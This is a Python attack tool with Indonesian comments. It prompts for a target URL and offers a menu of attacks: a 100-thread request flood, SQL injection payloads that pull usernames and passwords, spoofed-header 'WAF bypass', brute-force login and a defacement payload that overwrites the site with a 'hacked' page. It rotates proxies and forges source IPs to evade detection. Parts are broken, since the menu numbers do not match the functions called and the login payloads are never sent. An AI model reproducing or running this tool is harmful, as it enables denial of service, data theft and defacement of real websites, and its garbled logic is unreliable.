import requests
import random
import string
import logging
import time
import threading
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import re
from concurrent.futures import ThreadPoolExecutor
import os
import shutil
import datetime

# Warna untuk output terminal
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
M = '\033[95m'
C = '\033[96m'
N = '\033[0m'

logging.basicConfig(filename='log_serangan.txt', level=logging.INFO, format='%(asctime)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

def load_file(file_name):
    try:
        with open(file_name, 'r') as file:
            return [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        logging.error(f"File {file_name} tidak ditemukan!")
        return []

USER_AGENTS = load_file('user_agents.txt')
PROXIES = load_file('proxies.txt')

def is_valid_url(url):
    regex = re.compile(
        r'^(?:http|ftp)s?://'  
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.))'  
        r'(?::\d+)?'  
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return re.match(regex, url) is not None

def get_random_proxy():
    return random.choice(PROXIES) if PROXIES else None

def get_random_user_agent():
    return random.choice(USER_AGENTS) if USER_AGENTS else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

def random_delay(min_delay=1, max_delay=5):
    delay = random.randint(min_delay, max_delay)
    print(f"Menunggu selama {delay} detik...")
    time.sleep(delay)

def create_session():
    session = requests.Session()
    session.headers.update({
        'User-Agent': get_random_user_agent(),
        'Referer': ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)),
        'X-Forwarded-For': str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)),
    })
    return session

def send_request(url, session, proxy=None):
    try:
        response = session.get(url, proxies=proxy, timeout=5)
        if response.status_code == 200:
            print(f"Permintaan berhasil dikirim ke {url}")
        else:
            print(f"Permintaan gagal: Status Code {response.status_code}")
        return response
    except requests.exceptions.RequestException as e:
        print(f"Terjadi kesalahan: {e}")
        return None

# Advanced WAF bypass
def advanced_waf_bypass(url, session):
    headers = {
        'X-Real-IP': '127.0.0.1',
        'X-Forwarded-For': '127.0.0.1',
        'X-Injection-By': 'attacker',
        'User-Agent': get_random_user_agent(),
        'X-XSS-Protection': '0',
        'X-Content-Type-Options': 'nosniff',
        'Origin': 'http://attacker.com'
    }
    try:
        response = session.get(url, headers=headers, timeout=5)
        if response.status_code == 200:
            print("Custom headers berhasil melewati WAF!")
        else:
            print(f"Gagal melewati WAF dengan custom headers, status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Gagal dengan custom headers: {e}")

def advanced_sql_injection(url, session):
    payloads = [
        "' OR 1=1 --", 
        "' UNION SELECT null, username, password FROM users --", 
        "' AND 1=1 --", 
        "admin' OR 1=1--", 
        "%27%20OR%20%271%27%3D%271%27%3B%20--",
        "admin' AND SLEEP(5)--",  # Time-based SQL Injection
        "admin' AND (SELECT COUNT(*) FROM users)>0--"  # Advanced technique
    ]
    for payload in payloads:
        send_request(url + "?id=" + payload, session)

def brute_force_login(url, session):
    usernames = ["admin", "root", "user"]
    passwords = ["12345", "password", "admin", "root"]
    for username in usernames:
        for password in passwords:
            payload = {"username": username, "password": password}
            send_request(url + "/login", session)

def flooding_ddos(url, session):
    def flood_target():
        while True:
            send_request(url, session)
    
    with ThreadPoolExecutor(max_workers=100) as executor:
        for _ in range(100):
            executor.submit(flood_target)

def csrf_attack(url, session):
    csrf_token = "dummy_csrf_token"
    payload = {"username": "admin", "password": "password", "csrf_token": csrf_token}
    send_request(url + "/login", session)

# Deface Website dengan pemulihan otomatis dalam 24 jam
def deface_payload(url, session, backup_file_path):
    # Simpan halaman asli sebelum diubah
    if not os.path.exists(backup_file_path):
        try:
            response = session.get(url)
            with open(backup_file_path, 'w') as f:
                f.write(response.text)
            print("Backup halaman asli berhasil disimpan.")
        except requests.exceptions.RequestException as e:
            print(f"Error saat menyimpan backup halaman: {e}")

    # Payload deface
    payload = """
    <html>
        <head>
            <title>cyberheroes</title>
            <style>
                body {
                    background: linear-gradient(45deg, #1E90FF, #00BFFF, #87CEFA);
                    font-family: Arial, sans-serif;
                    color: white;
                    text-align: center;
                    margin: 0;
                    padding: 0;
                }
                h1 {
                    font-size: 60px;
                    text-shadow: 2px 2px 5px #00008B;
                    margin-top: 20%;
                }
                p {
                    font-size: 20px;
                    margin: 20px auto;
                    width: 70%;
                    text-shadow: 1px 1px 3px #4682B4;
                }
            </style>
        </head>
        <body>
            <h1>cyberheroes</h1>
            <p>server telah di hack</p>
            <p>server errror,tunggu 24jam</p>
        </body>
    </html>
    """
    data = {"content": payload}
    
    try:
        response = session.post(url, data=data)
        if response.status_code == 200:
            logging.info(f"Deface berhasil dikirim ke {url}")
            print(f"{G}Deface berhasil! Periksa URL target.{N}")
            # Menunggu selama 24 jam sebelum pemulihan
            print(f"Menunggu selama 24 jam untuk mengembalikan halaman asli...")
            time.sleep(86400)  # Tunggu 24 jam
            restore_backup(url, backup_file_path, session)  # Kembalikan halaman asli
        else:
            logging.error(f"Deface gagal, status code: {response.status_code}")
            print(f"{R}Deface gagal! Status code: {response.status_code}{N}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Deface gagal: {e}")
        print(f"{R}Deface gagal: {e}{N}")

def restore_backup(url, backup_file_path, session):
    try:
        with open(backup_file_path, 'r') as f:
            original_content = f.read()
        # Mengembalikan halaman asli
        data = {"content": original_content}
        response = session.post(url, data=data)
        if response.status_code == 200:
            logging.info(f"Halaman asli berhasil dikembalikan ke {url}")
            print(f"{G}Halaman berhasil dikembalikan!{N}")
        else:
            logging.error(f"Gagal mengembalikan halaman, status code: {response.status_code}")
            print(f"{R}Gagal mengembalikan halaman! Status code: {response.status_code}{N}")
    except FileNotFoundError:
        logging.error("Backup halaman tidak ditemukan!")
        print(f"{R}Backup halaman tidak ditemukan!{N}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Gagal mengembalikan halaman: {e}")
        print(f"{R}Gagal mengembalikan halaman: {e}{N}")

def main():
    url = input("Masukkan URL target: ")
    if not is_valid_url(url):
        print("URL yang dimasukkan tidak valid.")
        return

    session = create_session()
    logging.info(f"Mulai melakukan serangan pada {url}")

    # Menjalankan bypass WAF terlebih dahulu sebelum serangan lainnya
    advanced_waf_bypass(url, session)

    # Tempatkan file backup di sini
    backup_file_path = 'backup_halaman_asli.html'

    while True:
        print(f"{Y}Pilih jenis serangan:{N}")
        print(f"{R}1{G}. Flooding (DDoS)")
        print(f"{R}2{G}. SQL Injection")
        print(f"{R}3{G}. XSS")
        print(f"{R}4{G}. CSRF")
        print(f"{R}5{G}. Brute Force Login")
        print(f"{R}6{G}. Bypass WAF")
        print(f"{R}7{G}. Deface Website (Efek 24 Jam)")
        print(f"{R}0{G}. Exit")
        choice = input(f"{Y}Pilih serangan yang ingin dilakukan: {N}")
        
        if choice == '1':
            flooding_ddos(url, session)
        elif choice == '2':
            advanced_sql_injection(url, session)
        elif choice == '3':
            csrf_attack(url, session)
        elif choice == '4':
            brute_force_login(url, session)
        elif choice == '5':
            deface_payload(url, session, backup_file_path)  # Menjalankan fitur Deface dengan efek 24 jam
        elif choice == '6':
            print(f"{R}Keluar dari program...{N}")
            break
        else:
            print(f"{R}Pilihan tidak valid!{N}")

if __name__ == "__main__":
    main()
